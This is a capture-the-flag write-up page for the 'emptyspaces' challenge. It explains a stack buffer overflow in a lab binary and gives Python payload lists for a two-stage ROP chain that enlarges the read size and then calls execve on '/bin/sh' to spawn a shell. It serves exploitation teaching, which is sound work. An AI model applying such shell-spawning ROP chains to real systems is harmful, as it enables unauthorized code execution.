<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>emptyspaces - Cyberchallenge Writeups</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <link href="../../css/custom-styles.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "emptyspaces", url: "#_top", children: [
              {title: "Disassemble and Decompilation", url: "#disassemble-and-decompilation" },
              {title: "Solution", url: "#solution" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../ropasaurusrex/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../ropasaurusrex/" class="btn btn-xs btn-link">
        ropasaurusrex
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../" class="btn btn-xs btn-link">
        Return Oriented Programming (ROP)
      </a>
    </div>
    
  </div>

    

    <h1 id="emptyspaces">emptyspaces</h1>
<h2 id="disassemble-and-decompilation">Disassemble and Decompilation</h2>
<p><img alt="Empty Spaces Main" src="../../.github/assets/emptyspaces/main.png" /></p>
<p>As we can see the input string is 64 bytes long and the read is reading 137, thus we have a BO. The problem is that after the overflow of the buffer and the sEBP we have just 137-64-8=65 bytes that are not enough for a rop chain where we first read the string '/bin/sh' and then call execve.</p>
<h2 id="solution">Solution</h2>
<p>The idea is to use a multistage rop chain exploit. First we use a rop chain to set the RDX register to 0x1000 (arbitrary high value) and then we return to the read in the main. In this way we are rewriting the exact same buffer but we have more bytes for the second stage.</p>
<h3 id="first-stage">First Stage</h3>
<pre><code class="language-python">call_main = [
    b'A'*72,
    pop_rdx,
    p64(0x1000),
    main,
]
</code></pre>
<p>This stage is 96 bytes long, so it fits the 137 bytes read.</p>
<h3 id="second-stage">Second Stage</h3>
<pre><code class="language-python">read_execve_payload = [
    b'A'*88,
    pop_rdi,
    p64(0x0),
    pop_rsi,
    bss_addr,
    xor_eax_eax_syscall,
    pop_rax,
    p64(0x3b),
    pop_rdi,
    bss_addr,
    pop_rdx_pop_rsi,
    p64(0x0),
    p64(0x0),
    syscall
]
</code></pre>
<p>This stage fits the 0x1000 bytes we have set in the RDX register in the first stage. We overflow the buffer and overwrite the sRIP of the read() function. Basically the read() function in the main instead of returning to the main itself, it returns to the pop_rdi gadget. Then the chain begins, a read syscall is called to read the string '/bin/sh' in the bss section, then the execve syscall is called to execute the string '/bin/sh'.</p>
<p>Note that we have two different syscall gadgets. This is because the xor_eax_eax_syscall gadget is used to set the RAX register to 0x0, while the last syscall gadget is a terminator syscall, meaning that it will never return.</p>
<p>The complete exploit is in <a href="script.py">script.py</a>.</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../ropasaurusrex/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../ropasaurusrex/" class="btn btn-xs btn-link">
        ropasaurusrex
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../" class="btn btn-xs btn-link">
        Return Oriented Programming (ROP)
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/gio-del/ODC-Challenges-CTF/edit/main/rop/emptyspaces/README.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gio-del/ODC-Challenges-CTF">Windmill Dark</a> theme by None (noraj).</p>
</footer>

</body>
</html>